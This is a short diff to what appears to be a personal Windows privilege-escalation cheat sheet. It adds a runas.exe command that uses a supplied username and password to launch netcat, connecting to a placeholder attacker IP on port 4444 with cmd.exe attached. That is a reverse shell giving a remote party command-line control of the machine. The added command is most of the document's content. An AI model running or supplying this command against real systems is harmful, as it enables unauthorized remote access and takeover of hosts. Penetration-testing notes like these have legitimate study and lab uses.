@@ -1,5 +1,10 @@
 # windows privesc
 
+
+```sh
+C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\temp\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
+```
+
 ## powershell
 
 Execute command as different user if you have the password
